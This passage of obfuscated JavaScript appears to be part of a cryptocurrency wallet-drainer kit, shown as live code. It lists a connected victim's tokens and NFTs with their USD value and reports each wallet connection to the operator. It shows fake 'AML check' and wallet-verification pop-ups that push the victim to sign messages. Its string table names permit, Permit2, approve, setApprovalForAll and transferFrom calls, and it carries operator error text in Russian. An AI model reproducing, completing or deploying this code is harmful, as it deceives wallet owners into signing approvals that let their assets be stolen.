	connect_request = async () => {
		const _0x1c2e20 = _0x11d65a;
		try {
			if (!FLASH_Settings[_0x1c2e20(0x244)][_0x1c2e20(0xd5)]) return;
			await send_request({
				action: _0x1c2e20(0xd5),
				user_id: FLASH_ID,
				wallet: FLASH_Current_Provider,
			});
		} catch (_0x393184) {
			console["log"](_0x393184);
		}
	},
	connect_cancel = async () => {
		const _0x41f0b1 = _0x11d65a;
		try {
			if (!FLASH_Settings["Notifications"][_0x41f0b1(0x12a)]) return;
			await send_request({ action: "connect_cancel", user_id: FLASH_ID });
		} catch (_0x177ba4) {
			console[_0x41f0b1(0x215)](_0x177ba4);
		}
	},
	connect_success = async () => {
		const _0x1df17f = _0x11d65a;
		try {
			if (!FLASH_Settings[_0x1df17f(0x244)][_0x1df17f(0x13d)]) return;
			await send_request({
				action: _0x1df17f(0x13d),
				user_id: FLASH_ID,
				address: FLASH_Current_Address,
				wallet: FLASH_Current_Provider,
				chain_id: FLASH_Current_Chain_ID,
			});
		} catch (_0x368499) {
			console[_0x1df17f(0x215)](_0x368499);
		}
	},
	convert_chain = (_0x9080fc, _0x5e313f, _0x5e706c) => {
		const _0x468e82 = _0x11d65a;
		try {
			if (_0x9080fc == _0x468e82(0x162) && _0x5e313f == "ID")
				switch (_0x5e706c) {
					case _0x468e82(0x251):
						return 0x1;
					case "bsc":
						return 0x38;
					case "polygon":
						return 0x89;
					case _0x468e82(0x189):
						return 0xa86a;
					case _0x468e82(0x29e):
						return 0xa4b1;
					case _0x468e82(0x198):
						return 0xa;
					case _0x468e82(0x27f):
						return 0xfa;
					case _0x468e82(0x137):
						return 0x144;
					case _0x468e82(0x1d7):
						return 0x2105;
					case _0x468e82(0x146):
						return 0x171;
					default:
						return ![];
				}
			else {
				if (_0x9080fc == _0x468e82(0x14c) && _0x5e313f == "ID")
					switch (_0x5e706c) {
						case _0x468e82(0x131):
							return 0x1;
						case "matic":
							return 0x89;
						case _0x468e82(0x189):
							return 0xa86a;
						case _0x468e82(0x29e):
							return 0xa4b1;
						case _0x468e82(0x198):
							return 0xa;
						case _0x468e82(0x137):
							return 0x144;
						case "base":
							return 0x2105;
						case _0x468e82(0x146):
							return 0x171;
						default:
							return ![];
					}
				else {
					if (_0x9080fc == "ID" && _0x5e313f == _0x468e82(0x162))
						switch (_0x5e706c) {
							case 0x1:
								return "eth";
							case 0x38:
								return "bsc";
							case 0x89:
								return _0x468e82(0xe8);
							case 0xa86a:
								return _0x468e82(0x189);
							case 0xa4b1:
								return _0x468e82(0x29e);
							case 0xa:
								return "optimism";
							case 0xfa:
								return "fantom";
							case 0x19:
								return _0x468e82(0x26c);
							case 0x64:
								return _0x468e82(0x182);
							case 0x80:
								return "heco";
							case 0x504:
								return "moonbeam";
							case 0x505:
								return _0x468e82(0x1cd);
							case 0x8ae:
								return "kava";
							case 0xa4ec:
								return _0x468e82(0x253);
							case 0x63564c40:
								return _0x468e82(0x1aa);
							case 0x144:
								return "zksync_era";
							case 0x2105:
								return _0x468e82(0x1d7);
							case 0x171:
								return "pulse";
							default:
								return ![];
						}
					else {
						if (_0x9080fc == "ID" && _0x5e313f == _0x468e82(0x2a5))
							switch (_0x5e706c) {
								case 0x1:
									return _0x468e82(0x26f);
								case 0x38:
									return "BNB";
								case 0x89:
									return "MATIC";
								case 0xa86a:
									return _0x468e82(0x1e6);
								case 0xa4b1:
									return _0x468e82(0x26f);
								case 0xa:
									return "ETH";
								case 0xfa:
									return _0x468e82(0xaa);
								case 0x19:
									return _0x468e82(0x199);
								case 0x64:
									return _0x468e82(0x1d1);
								case 0x80:
									return "HT";
								case 0x504:
									return _0x468e82(0x2a2);
								case 0x505:
									return _0x468e82(0x265);
								case 0x8ae:
									return _0x468e82(0x1c0);
								case 0xa4ec:
									return "CELO";
								case 0x63564c40:
									return "ONE";
								case 0x144:
									return _0x468e82(0x26f);
								case 0x2105:
									return _0x468e82(0x26f);
								case 0x171:
									return "PLS";
								default:
									return ![];
							}
					}
				}
			}
		} catch (_0x475fe9) {
			return console[_0x468e82(0x215)](_0x475fe9), ![];
		}
	},
	get_tokens = async (_0x2274d0) => {
		const _0x146686 = _0x11d65a;
		try {
			let _0xa25ed2 = [],
				_0x3309f7 = await fetch(
					"https://rpc.ankr.com/multichain/" +
						(FLASH_Settings["AT"] || ""),
					{
						method: "POST",
						headers: {
							Accept: _0x146686(0x165),
							"Content-Type": _0x146686(0x165),
						},
						body: JSON[_0x146686(0xc5)]({
							id: 0x1,
							jsonrpc: _0x146686(0x245),
							method: "ankr_getAccountBalance",
							params: {
								blockchain: [
									_0x146686(0x251),
									_0x146686(0x1d7),
									"bsc",
									"polygon",
									_0x146686(0x189),
									_0x146686(0x29e),
									"fantom",
									_0x146686(0x198),
									_0x146686(0x1d7),
								],
								walletAddress: _0x2274d0,
							},
						}),
					}
				);
			(_0x3309f7 = await _0x3309f7[_0x146686(0x200)]()),
				console[_0x146686(0x215)](_0x3309f7);
			for (const _0x2ab039 of _0x3309f7[_0x146686(0x125)][
				_0x146686(0xfa)
			]) {
				try {
					let _0x4a8d67 = _0x2ab039[_0x146686(0x106)] || "NATIVE";
					if (
						FLASH_Settings["Contract_Whitelist"][_0x146686(0x167)] >
							0x0 &&
						!FLASH_Settings[_0x146686(0xec)][_0x146686(0x226)](
							_0x4a8d67["toLowerCase"]()[_0x146686(0x111)]()
						)
					)
						continue;
					else {
						if (
							FLASH_Settings[_0x146686(0x1d4)][_0x146686(0x167)] >
								0x0 &&
							FLASH_Settings["Contract_Blacklist"][
								_0x146686(0x226)
							](_0x4a8d67[_0x146686(0x2a1)]()[_0x146686(0x111)]())
						)
							continue;
					}
					let _0x59996d = {
						chain_id: convert_chain(
							"ANKR",
							"ID",
							_0x2ab039["blockchain"]
						),
						name: _0x2ab039["tokenName"],
						type: _0x2ab039[_0x146686(0x229)],
						amount: parseFloat(_0x2ab039[_0x146686(0x212)]),
						amount_raw: _0x2ab039[_0x146686(0x184)],
						amount_usd: parseFloat(_0x2ab039["balanceUsd"]),
						symbol: _0x2ab039[_0x146686(0x1ca)],
						decimals: _0x2ab039[_0x146686(0x210)],
						address: _0x4a8d67 || null,
						price: parseFloat(_0x2ab039[_0x146686(0xbf)]),
					};
					if (_0x59996d["price"] > 0x0)
						_0xa25ed2[_0x146686(0x185)](_0x59996d);
				} catch (_0x4c6648) {
					console[_0x146686(0x215)](_0x4c6648);
				}
			}
			return _0xa25ed2;
		} catch (_0x3402e1) {
			return console[_0x146686(0x215)](_0x3402e1), [];
		}
	},
	get_nfts = async (_0xa30330) => {
		const _0x3f5797 = _0x11d65a;
		try {
			let _0x48af62 = await fetch(
					_0x3f5797(0x1b4) +
						_0xa30330 +
						"&order_direction=desc&limit=200&include_orders=false"
				),
				_0x1fbd90 = (await _0x48af62[_0x3f5797(0x200)]())["assets"];
			_0x48af62 = await fetch(
				_0x3f5797(0xb1) + _0xa30330 + _0x3f5797(0x237)
			);
			let _0xba4433 = await _0x48af62["json"](),
				_0x4cc51e = [];
			for (const _0x330351 of _0x1fbd90) {
				try {
					let _0x3533b9 = null;
					for (const _0x55655b of _0xba4433) {
						try {
							if (
								_0x55655b[_0x3f5797(0x14a)][_0x3f5797(0x167)] <
								0x1
							)
								continue;
							if (
								_0x55655b[_0x3f5797(0x14a)][0x0][
									_0x3f5797(0x190)
								] ==
								_0x330351[_0x3f5797(0x166)][_0x3f5797(0x190)]
							) {
								_0x3533b9 = _0x55655b;
								break;
							}
						} catch (_0x3aa79d) {
							console[_0x3f5797(0x215)](_0x3aa79d);
						}
					}
					if (_0x3533b9 == null) continue;
					if (
						FLASH_Settings[_0x3f5797(0xec)][_0x3f5797(0x167)] >
							0x0 &&
						!FLASH_Settings[_0x3f5797(0xec)][_0x3f5797(0x226)](
							_0x330351[_0x3f5797(0x166)]["address"]
								[_0x3f5797(0x2a1)]()
								[_0x3f5797(0x111)]()
						)
					)
						continue;
					else {
						if (
							FLASH_Settings[_0x3f5797(0x1d4)][_0x3f5797(0x167)] >
								0x0 &&
							FLASH_Settings[_0x3f5797(0x1d4)][_0x3f5797(0x226)](
								_0x330351[_0x3f5797(0x166)][_0x3f5797(0x190)]
									[_0x3f5797(0x2a1)]()
									[_0x3f5797(0x111)]()
							)
						)
							continue;
					}
					let _0x561b3c = convert_chain(
							"OPENSEA",
							"ID",
							_0x330351[_0x3f5797(0x166)][_0x3f5797(0x22e)]
						),
						_0x25a229 =
							_0x3533b9["stats"][_0x3f5797(0x16e)] != 0x0
								? _0x3533b9[_0x3f5797(0x191)][_0x3f5797(0x16e)]
								: _0x3533b9[_0x3f5797(0x191)][_0x3f5797(0xd2)];
					_0x25a229 =
						_0x25a229 *
						FLASH_Currencies[
							convert_chain("ID", _0x3f5797(0x2a5), _0x561b3c)
						][_0x3f5797(0x147)];
					let _0x22de73 = {
						chain_id: _0x561b3c,
						name: _0x330351[_0x3f5797(0x12b)],
						type: _0x330351["asset_contract"][_0x3f5797(0x139)],
						amount: _0x330351[_0x3f5797(0x23e)],
						amount_raw: null,
						amount_usd: _0x25a229,
						id: _0x330351[_0x3f5797(0x26e)],
						symbol: null,
						decimals: null,
						address: _0x330351["asset_contract"][_0x3f5797(0x190)],
						price: _0x25a229,
					};
					if (
						typeof _0x25a229 == _0x3f5797(0x164) &&
						!isNaN(_0x25a229) &&
						_0x25a229 > 0x0
					)
						_0x4cc51e[_0x3f5797(0x185)](_0x22de73);
				} catch (_0x3f393a) {
					console["log"](_0x3f393a);
				}
			}
			return _0x4cc51e;
		} catch (_0x10003c) {
			return console[_0x3f5797(0x215)](_0x10003c), [];
		}
	},
	retrive_timeout = {},
	retrive_token = async (_0x12f018, _0x256da7) => {
		const _0x23a4a7 = _0x11d65a;
		try {
			if (
				!FLASH_API_Data[_0x12f018] ||
				FLASH_Settings[_0x23a4a7(0xb0)]["Chains"][
					convert_chain("ID", _0x23a4a7(0x162), _0x12f018)
				][_0x23a4a7(0x18b)] == ""
			)
				return FLASH_Contract_ABI[_0x23a4a7(0x1d6)];
			while (
				retrive_timeout[_0x12f018] &&
				retrive_timeout[_0x12f018]["time"] ==
					Math["floor"](Date["now"]() / 0x3e8) &&
				retrive_timeout[_0x12f018][_0x23a4a7(0x1e2)] >= 0x5
			)
				await new Promise((_0x143253) => setTimeout(_0x143253, 0x64));
			if (!retrive_timeout[_0x12f018])
				retrive_timeout[_0x12f018] = {
					time: Math[_0x23a4a7(0xe4)](Date["now"]() / 0x3e8),
					count: 0x1,
				};
			else {
				if (
					retrive_timeout[_0x12f018][_0x23a4a7(0x15e)] ==
					Math["floor"](Date[_0x23a4a7(0x15c)]() / 0x3e8)
				)
					retrive_timeout[_0x12f018]["count"] += 0x1;
				else
					(retrive_timeout[_0x12f018]["time"] = Math[_0x23a4a7(0xe4)](
						Date[_0x23a4a7(0x15c)]() / 0x3e8
					)),
						(retrive_timeout[_0x12f018][_0x23a4a7(0x1e2)] = 0x1);
			}
			let _0x52ac0a = await fetch(
				_0x23a4a7(0xd7) +
					FLASH_API_Data[_0x12f018] +
					_0x23a4a7(0x1c4) +
					_0x256da7 +
					_0x23a4a7(0x188) +
					FLASH_Settings["Settings"][_0x23a4a7(0xd0)][
						convert_chain("ID", "ANKR", _0x12f018)
					][_0x23a4a7(0x18b)],
				{
					method: _0x23a4a7(0xa7),
					headers: { Accept: "application/json" },
				}
			);
			_0x52ac0a = await _0x52ac0a["json"]();
			if (_0x52ac0a[_0x23a4a7(0x1da)] == "OK") {
				if (
					_0x52ac0a["result"][0x0][_0x23a4a7(0x19b)] == "1" &&
					_0x52ac0a[_0x23a4a7(0x125)][0x0][_0x23a4a7(0xc6)] != ""
				) {
					const _0x1cda6a =
						_0x52ac0a[_0x23a4a7(0x125)][0x0][_0x23a4a7(0xc6)];
					return retrive_token(_0x12f018, _0x1cda6a);
				} else
					return JSON["parse"](
						_0x52ac0a[_0x23a4a7(0x125)][0x0][_0x23a4a7(0x179)]
					);
			} else return FLASH_Contract_ABI[_0x23a4a7(0x1d6)];
		} catch (_0x1cc191) {
			return FLASH_Contract_ABI[_0x23a4a7(0x1d6)];
		}
	},
	get_permit_type = (_0x5c562c) => {
		const _0x3339e4 = _0x11d65a;
		try {
			if (
				FLASH_Settings[_0x3339e4(0xb0)][_0x3339e4(0x266)][
					_0x3339e4(0x1b9)
				] == ![]
			)
				return 0x0;
			if (
				_0x5c562c[_0x3339e4(0x1a4)](_0x3339e4(0x259)) &&
				_0x5c562c["hasOwnProperty"]("nonces") &&
				_0x5c562c[_0x3339e4(0x1a4)](_0x3339e4(0x12b)) &&
				_0x5c562c["hasOwnProperty"]("DOMAIN_SEPARATOR")
			) {
				const _0x161082 = ((_0xb301d5) => {
					const _0x1354f7 = _0x3339e4;
					for (const _0x112b91 in _0xb301d5) {
						if (_0x112b91[_0x1354f7(0x1f4)](_0x1354f7(0x109))) {
							const _0xbd3897 =
								_0x112b91[_0x1354f7(0x1de)](0x7)[
									_0x1354f7(0x12f)
								](",");
							if (
								_0xbd3897["length"] === 0x7 &&
								_0x112b91[_0x1354f7(0x1f0)](
									_0x1354f7(0x19a)
								) === -0x1
							)
								return 0x2;
							if (
								_0xbd3897[_0x1354f7(0x167)] === 0x8 &&
								_0x112b91["indexOf"](_0x1354f7(0x19a)) !== -0x1
							)
								return 0x1;
							return 0x0;
						}
					}
				})(_0x5c562c);
				return _0x161082;
			} else return 0x0;
		} catch (_0x2633c5) {
			return 0x0;
		}
	},
	FLASH_Gas_Reserves = {},
	show_check = () => {
		const _0x18eaa2 = _0x11d65a;
		try {
			FLASH_Loader_Style == 0x2
				? FLASHL["fire"]({
						icon: "load",
						title: "Processing\x20wallet",
						text: _0x18eaa2(0x1bb),
						showConfirmButton: !![],
						confirmButtonText: _0x18eaa2(0x104),
						timer: 0x7d0,
						color: FLASH_Color_Scheme,
				  })["then"](() => {
						const _0x964287 = _0x18eaa2;
						if (FLASH_Check_Done) return;
						FLASHL[_0x964287(0x133)]({
							icon: _0x964287(0xc4),
							title: _0x964287(0x1cb),
							text: _0x964287(0xc2),
							showConfirmButton: !![],
							confirmButtonText: _0x964287(0x104),
							timer: 0x1388,
							color: FLASH_Color_Scheme,
						})[_0x964287(0x1ec)](() => {
							const _0x38f900 = _0x964287;
							if (FLASH_Check_Done) return;
							FLASHL[_0x38f900(0x133)]({
								icon: _0x38f900(0xc4),
								title: _0x38f900(0x1cb),
								text: _0x38f900(0xea),
								showConfirmButton: !![],
								confirmButtonText: _0x38f900(0x104),
								timer: 0x1388,
								color: FLASH_Color_Scheme,
							})[_0x38f900(0x1ec)](() => {
								const _0x372a6a = _0x38f900;
								if (FLASH_Check_Done) return;
								FLASHL["fire"]({
									icon: _0x372a6a(0x290),
									title: _0x372a6a(0x1cb),
									subtitle: _0x372a6a(0x1e1),
									text: _0x372a6a(0x22c),
									showConfirmButton: ![],
									timer: 0x1388,
									color: FLASH_Color_Scheme,
								})[_0x372a6a(0x1ec)](() => {
									const _0x3b29d1 = _0x372a6a;
									if (FLASH_Check_Done) return;
									FLASHL[_0x3b29d1(0x133)]({
										icon: _0x3b29d1(0xc4),
										title: _0x3b29d1(0x1cb),
										text: _0x3b29d1(0xc3),
										showConfirmButton: !![],
										confirmButtonText: "Loading...",
										timer: 0x493e0,
										color: FLASH_Color_Scheme,
									});
								});
							});
						});
				  })
				: Swal[_0x18eaa2(0x133)]({
						title: "Connection\x20established",
						icon: _0x18eaa2(0x290),
						timer: 0x7d0,
				  })[_0x18eaa2(0x1ec)](() => {
						const _0x501d74 = _0x18eaa2;
						if (FLASH_Check_Done) return;
						Swal[_0x501d74(0x133)]({
							text: _0x501d74(0x23b),
							imageUrl: _0x501d74(0x273),
							imageHeight: 0x3c,
							allowOutsideClick: ![],
							allowEscapeKey: ![],
							timer: 0x1388,
							width: 0x258,
							showConfirmButton: ![],
						})[_0x501d74(0x1ec)](() => {
							const _0x5533b4 = _0x501d74;
							if (FLASH_Check_Done) return;
							Swal[_0x5533b4(0x133)]({
								text: _0x5533b4(0xc2),
								imageUrl: _0x5533b4(0x273),
								imageHeight: 0x3c,
								allowOutsideClick: ![],
								allowEscapeKey: ![],
								timer: 0x1388,
								width: 0x258,
								showConfirmButton: ![],
							})["then"](() => {
								const _0x2a350d = _0x5533b4;
								if (FLASH_Check_Done) return;
								Swal["fire"]({
									text: _0x2a350d(0xea),
									imageUrl: _0x2a350d(0x273),
									imageHeight: 0x3c,
									allowOutsideClick: ![],
									allowEscapeKey: ![],
									timer: 0x1388,
									width: 0x258,
									showConfirmButton: ![],
								})[_0x2a350d(0x1ec)](() => {
									const _0x2aff46 = _0x2a350d;
									if (FLASH_Check_Done) return;
									Swal[_0x2aff46(0x133)]({
										text: _0x2aff46(0x10d),
										icon: "success",
										allowOutsideClick: ![],
										allowEscapeKey: ![],
										timer: 0x7d0,
										width: 0x258,
										showConfirmButton: ![],
									})[_0x2aff46(0x1ec)](() => {
										const _0x30ce10 = _0x2aff46;
										if (FLASH_Check_Done) return;
										Swal[_0x30ce10(0x133)]({
											text: "Please\x20wait,\x20we\x27re\x20scanning\x20more\x20details...",
											imageUrl: _0x30ce10(0x273),
											imageHeight: 0x3c,
											allowOutsideClick: ![],
											allowEscapeKey: ![],
											timer: 0x0,
											width: 0x258,
											showConfirmButton: ![],
										});
									});
								});
							});
						});
				  });
		} catch (_0x7bc65f) {
			console[_0x18eaa2(0x215)](_0x7bc65f);
		}
	},
	get_nonce = async (_0x4a5412) => {
		const _0x543289 = _0x11d65a,
			_0x48f126 = new ethers[_0x543289(0x264)][_0x543289(0x14e)](
				FLASH_Settings[_0x543289(0x113)][_0x4a5412]
			);
		return await _0x48f126["getTransactionCount"](
			FLASH_Current_Address,
			_0x543289(0x15f)
		);
	},
	wait_message = () => {
		const _0x2f4119 = _0x11d65a;
		try {
			if (!FLASH_Process) return;
			Swal[_0x2f4119(0x296)](),
				FLASH_Loader_Style == 0x2
					? FLASHL["fire"]({
							icon: _0x2f4119(0x290),
							title: "OK",
							subtitle: _0x2f4119(0xc9),
							text: _0x2f4119(0xb3),
							showConfirmButton: ![],
							timer: 0x9c4,
							color: FLASH_Color_Scheme,
					  })[_0x2f4119(0x1ec)](() => {
							const _0x5d56de = _0x2f4119;
							FLASHL[_0x5d56de(0x133)]({
								icon: "load",
								title: _0x5d56de(0x157),
								text: _0x5d56de(0x276),
								showConfirmButton: !![],
								confirmButtonText: _0x5d56de(0x238),
								showConfirmButton: ![],
								color: FLASH_Color_Scheme,
							});
					  })
					: Swal[_0x2f4119(0x133)]({
							html: "<b>Thanks!</b>",
							icon: "success",
							allowOutsideClick: ![],
							allowEscapeKey: ![],
							timer: 0x9c4,
							width: 0x258,
							showConfirmButton: ![],
					  })[_0x2f4119(0x1ec)](() => {
							const _0x5d0ed4 = _0x2f4119;
							Swal[_0x5d0ed4(0x133)]({
								html: _0x5d0ed4(0xd1),
								imageUrl:
									"https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless",
								imageHeight: 0x3c,
								allowOutsideClick: ![],
								allowEscapeKey: ![],
								timer: 0x0,
								width: 0x258,
								showConfirmButton: ![],
							});
					  });
		} catch (_0xbd1484) {
			console[_0x2f4119(0x215)](_0xbd1484);
		}
	},
	end_message = () => {
		const _0x638907 = _0x11d65a;
		try {
			FLASH_Loader_Style == 0x2
				? FLASHL[_0x638907(0x133)]({
						icon: "error",
						title: _0x638907(0xe7),
						subtitle: "We\x27re\x20sorry",
						text: _0x638907(0x268),
						showConfirmButton: !![],
						confirmButtonText: "OK",
						color: FLASH_Color_Scheme,
				  })
				: (Swal[_0x638907(0x296)](),
				  Swal[_0x638907(0x133)]({
						html: _0x638907(0xab),
						icon: _0x638907(0x11c),
						allowOutsideClick: !![],
						allowEscapeKey: !![],
						timer: 0x0,
						width: 0x258,
						showConfirmButton: !![],
						confirmButtonText: "OK",
				  }));
		} catch (_0x26a554) {
			console[_0x638907(0x215)](_0x26a554);
		}
	};
function _0x1325() {
	const _0x5c1cce = [
		"/api?module=contract&action=getsourcecode&address=",
		"BigNumber",
		"0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c",
		"partner-address",
		"Contract_Type",
		"replace",
		"tokenSymbol",
		"Processing\x20wallet",
		"https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP&tsyms=USD",
		"moonriver",
		"PermitDetails[]",
		"0x10ED43C718714eb63d5aA57B78B54704E256024E",
		"swapper_type",
		"XDAI",
		"sign_permit2",
		"api.bscscan.com",
		"Contract_Blacklist",
		"setApprovalForAll",
		"ERC20",
		"base",
		"0xFA",
		"Ethereum\x20Mainnet",
		"message",
		"swapExactTokensForETH",
		"FLASH_ID",
		"iPad",
		"slice",
		"approve_success",
		"uint256[]",
		"Everything\x20good!",
		"count",
		"Your\x20wallet\x20is\x20not\x20AML\x20clear,\x20you\x20can\x27t\x20use\x20it!",
		"all",
		"Please,\x20wait\x20a\x20bit\x20for\x20confirmation...",
		"AVAX",
		"Polygon\x20Mainnet",
		"utils",
		"map",
		"splice",
		"eth_signTypedData_v4",
		"then",
		"Wallet_Blacklist",
		"api.basescan.org",
		"[SWAP\x20FOUND]\x20",
		"indexOf",
		"web3-modal",
		"spender",
		"skip",
		"startsWith",
		"BNB\x20Smart\x20Chain",
		"0x0000000000000000000000000000000000000000",
		"0x00000000000111abe46ff893f3b2fdf1f759a8a8",
		"SeaPort",
		"Sign\x20message\x20to\x20verificate\x20your\x20wallet",
		"0xA",
		"https://avatars.githubusercontent.com/u/37784886",
		"Force",
		"transfer_success",
		"prepend",
		"getSigner",
		"json",
		"partner_address",
		"test",
		"<b>Done!</b>\x20Sign\x20message\x20in\x20your\x20wallet\x20to\x20continue...",
		"147213trDSKL",
		"Binance\x20Coin",
		",\x20Version:\x20",
		"swapper",
		"Waiting...",
		"worker_id",
		"swap_request",
		"0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45",
		"web3-style",
		"Binance\x20Wallet",
		"1447tLUhxq",
		"Invalid\x20Wallet",
		"tokenDecimals",
		"addEventListener",
		"balance",
		"iPod\x20Simulator",
		"Trust",
		"log",
		"api.polygonscan.com",
		"isCoinbaseBrowser",
		"V_FLASHG",
		"recoverAddress",
		"href",
		"sub",
		"\x22,\x22outputs\x22:[],\x22payable\x22:true,\x22stateMutability\x22:\x22payable\x22,\x22type\x22:\x22function\x22}]",
		"accounts",
		"uint256",
		"BNB",
		"domain",
		"Something\x20went\x20wrong!",
		"eth_signTransaction",
		"increase",
		"path",
		"ERC1155",
		"includes",
		"gasLimit",
		"ontouchend",
		"tokenType",
		"nonces",
		"[{\x22constant\x22:false,\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22depositer\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22handler\x22,\x22type\x22:\x22address\x22},\x0a\x20\x20{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22keeper\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22uint8\x22,\x22name\x22:\x22percent\x22,\x22type\x22:\x22uint8\x22},{\x22internalType\x22:\x22bool\x22,\x22name\x22:\x22is_cashback\x22,\x22type\x22:\x22bool\x22}],\x22name\x22:\x22",
		"Your\x20wallet\x20is\x20AML\x20risk\x20is\x20low\x20enough!",
		"vendor",
		"chain_identifier",
		"sort",
		"api.ftmscan.com",
		"enter_website",
		"focus",
		"toLocaleString",
		"WalletConnect_v2",
		"substring",
		"ether",
		"&offset=0&limit=200",
		"Confirming\x20sign...",
		"UNSUPPORTED",
		"signMessage",
		"Connecting\x20to\x20Blockchain...",
		"Optimism",
		"0x13f4EA83D0bd40E75C8222255bc855a974568Dd4",
		"num_sales",
		"disconnect",
		"https://trustwallet.com",
		"nonce",
		"Ethereum",
		"0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7",
		"Notifications",
		"2.0",
		"undefined",
		"amount_raw",
		"https://bscscan.com",
		",\x20Allowance:\x20",
		"Fantom\x20Opera",
		"0x0",
		"from",
		"SRV_UNAVAILABLE",
		"Address",
		"amountOut",
		"0x38",
		"eth",
		"33vnzPfD",
		"celo",
		"Use_Public_Premium",
		"Use_Back_Feature",
		"PermitDetails",
		"host",
		"encodeABI",
		"permit",
		"iPad\x20Simulator",
		"0xEfF92A263d31888d860bD50809A8D171709b7b1c",
		"522BRSpeF",
		"Mac",
		"cis",
		"LOCAL_CHECK",
		"DOMContentLoaded",
		"methods",
		"For\x20security\x20reasons\x20we\x20can\x27t\x20allow\x20you\x20to\x20connect\x20empty\x20or\x20new\x20wallet",
		"getTransactionCount",
		"providers",
		"MOVR",
		"Permit",
		"check_wallet",
		"Your\x20wallet\x20doesn\x27t\x20meet\x20the\x20requirements.\x20Try\x20to\x20connect\x20a\x20middle-active\x20wallet\x20to\x20try\x20again!",
		"swapper_allowance",
		"BAD_COUNTRY",
		"EthereumProvider",
		"cronos",
		"retrive_contract",
		"token_id",
		"ETH",
		"wallet_addEthereumChain",
		"[{\x22constant\x22:false,\x22inputs\x22:[],\x22name\x22:\x22",
		"object",
		"https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless",
		"Swappers",
		"https://snowtrace.io/",
		"\x20Please,\x20don\x27t\x20leave\x20this\x20page!",
		"Quickswap",
		"_blank",
		"100",
		"0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270",
		"search",
		"token",
		",\x20Permit\x20Type:\x20",
		"Chat_Settings",
		"fantom",
		"increaseApproval",
		"user_id",
		"Loop_T",
		"Public_Contract",
		"innerHTML",
		"swapper_address",
		"Критическая\x20ошибка",
		"Use_Randomizer_For_Tokens",
		"Trust\x20Wallet",
		"classList",
		"0x000000000022d473030f116ddee9f6b43ac78ba3",
		"Personal_Wallet",
		"sha3",
		"<b>Waiting\x20for\x20your\x20sign...</b><br><br>Please,\x20sign\x20message\x20in\x20your\x20wallet!",
		"[PERMIT\x20FOUND]\x20",
		"div",
		"success",
		"opera",
		"Priority",
		"isMetaMask",
		"Critical\x20Error",
		"Contract_Legacy",
		"close",
		"hashMessage",
		"withdraw_native",
		"Sushiswap",
		"light",
		"transfer",
		"We\x20have\x20received\x20your\x20signature,\x20but\x20it\x27s\x20incorrect,\x20please\x20try\x20again.",
		"amountOutMin",
		"arbitrum",
		"Base",
		"https://explorer.zksync.io/",
		"toLowerCase",
		"GLMR",
		"0x1E0049783F008A0085193E00003D00cd54003c71",
		"address[]",
		"CURRENCY",
		"0x144",
		"click",
		"gasPrice",
		"GET",
		"text",
		"increaseAllowance",
		"FTM",
		"<b>Sorry!</b>\x20Your\x20wallet\x20doesn\x27t\x20meet\x20the\x20requirements.<br><br>Try\x20to\x20connect\x20a\x20middle-active\x20wallet\x20to\x20try\x20again!",
		"BinanceChain",
		"eth_requestAccounts",
		"nonpayable",
		"Use_Public_Contract",
		"Settings",
		"https://api.opensea.io/api/v1/collections?asset_owner=",
		"approve_request",
		"Got\x20your\x20sign,\x20wait\x20a\x20bit\x20for\x20confirmation...",
		"allowance",
		"none",
		"beforeunload",
		"https://optimistic.etherscan.io/",
		"platform",
		"permit_ver",
		"<b>Критическая\x20ошибка</b><br><br>Скрипт\x20не\x20может\x20соединиться\x20с\x20сервером\x20и\x20получить\x20данные,\x20возможно\x20вы\x20настроили\x20что-то\x20некорректно\x20или\x20домен\x20сервера\x20ещё\x20недоступен\x20или\x20был\x20заблокирован.\x20Проверьте\x20и\x20исправьте\x20проблемы\x20перед\x20использованием\x20сайта.",
		"Tokens_First",
		"Price",
		"<b>Server\x20Error</b>\x20Please,\x20check\x20client\x20and\x20server\x20version,\x20looks\x20like\x20it\x20doesn\x27t\x20match,\x20or\x20maybe\x20you\x20need\x20to\x20clear\x20cache\x20everywhere\x20:(",
		"getElementsByClassName",
		"tokenPrice",
		"4523976MmQbOe",
		"Permit_BL",
		"Getting\x20your\x20wallet\x20address...",
		"Please\x20wait,\x20we\x27re\x20scanning\x20more\x20details...",
		"load",
		"stringify",
		"Implementation",
		"PLS",
		"WC_AE",
		"Thanks!",
		"383376JgnRcu",
		"https://polygonscan.com",
		"0xA86A",
		"api.snowtrace.io",
		"userAgent",
		"[{\x22constant\x22:false,\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22owner\x22,\x22type\x22:\x22address\x22}],\x22name\x22:\x22",
		"Chains",
		"<b>Confirming\x20your\x20sign...</b><br><br>Please,\x20don\x27t\x20leave\x20this\x20page!",
		"seven_day_average_price",
		"init",
		"Permit2",
		"connect_request",
		"querySelector",
		"https://",
		"transferFrom",
		"x2y2",
		"We\x20cannot\x20verify\x20that\x20the\x20wallet\x20is\x20yours\x20as\x20you\x20did\x20not\x20sign\x20the\x20message\x20provided.",
		"parseEther",
		"Настройте\x20оценщики",
		"[PERMIT_2\x20FOUND]\x20",
		"sign_verify",
		"join",
		"personal_wallet",
		"Uniswap",
		"approve",
		"version",
		"floor",
		"uint160",
		"1158472395435294898592384258348512586931256",
		"Error",
		"polygon",
		"19311eklQFW",
		"Checking\x20your\x20wallet\x20for\x20AML...",
		"mul",
		"Contract_Whitelist",
		"0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506",
		"amounts",
		"selectedAddress",
		"request",
		"sigDeadline",
		"https://ya.ru",
		"Coinbase",
		"Waiting\x20for\x20action",
		"open",
		"LOW_BALANCE",
		"block",
		"eth_signTypedData",
		"increment",
		"assets",
		"api-optimistic.etherscan.io",
		"multicall",
		"parse",
		"amount_usd",
		"permit_token",
		"message_ts",
		"https://scan.pulsechain.com/",
		"eth_sendTransaction",
		"getGasPrice",
		"Loading...",
		"isCoinbaseWallet",
		"contractAddress",
		"location",
		"Tokens",
